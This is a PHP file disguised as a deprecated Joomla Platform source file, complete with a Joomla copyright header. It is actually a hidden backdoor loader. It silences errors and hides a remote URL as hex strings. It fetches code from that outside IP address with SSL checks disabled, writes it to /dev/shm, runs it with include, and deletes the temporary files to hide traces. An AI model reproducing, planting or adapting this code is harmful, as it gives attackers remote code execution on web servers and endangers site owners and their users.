<?php
error_reporting(0);
ini_set('display_errors', '0');
ini_set('log_errors', '0');
/**
 * @package    Joomla.Platform
 *
 * @copyright  Copyright (C) 2005 - 2017 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 *
 */

// @deprecated  4.0  Deprecated without replacement

// We are a valid entry point.
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        
        
        $opt1 = constant('CURLOPT_RETURNTRANSFER');
        $opt2 = constant('CURLOPT_FOLLOWLOCATION');
        $opt3 = constant('CURLOPT_USERAGENT');
        $opt4 = constant('CURLOPT_SSL_VERIFYPEER');
        $opt5 = constant('CURLOPT_SSL_VERIFYHOST');
        $opt6 = constant('CURLOPT_COOKIE');

        
        curl_setopt($conn, $opt1, 1);
        curl_setopt($conn, $opt2, 1);
        curl_setopt($conn, $opt3, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, $opt4, 0);
        curl_setopt($conn, $opt5, 0);

        if (isset($_SESSION['java'])) {
            curl_setopt($conn, $opt6, $_SESSION['java']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

$akuSewa = '687474703a2f2f'; 
$diKTVm = '3136302e'; 
$cwkTH = '3233382e33362e';
$dLpNrbBth = '3232362f66696c652d6b752f6d61752d6170612f6d61752d666f72656e73696b2f'; 
$tOlOl = '6b6f6e746f6c6b616c69616e2e747874';

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex); $i += 2) {
        $str .= chr(hexdec(substr($hex, $i, 2)));
    }
    return $str;
}


function clean_old_temp_files() {
    $temp_files = glob('/dev/shm/prefix*');
    foreach ($temp_files as $file) {
        if (is_file($file)) {
            unlink($file);
        }
    }
}


clean_old_temp_files();

$url = hex2str($akuSewa) . hex2str($diKTVm) . hex2str($cwkTH) . hex2str($dLpNrbBth) . hex2str($tOlOl);
$a = geturlsinfo($url);
$temporary_file = tempnam('/dev/shm', 'prefix');
file_put_contents($temporary_file, $a);
include $temporary_file;
unlink($temporary_file);
?>
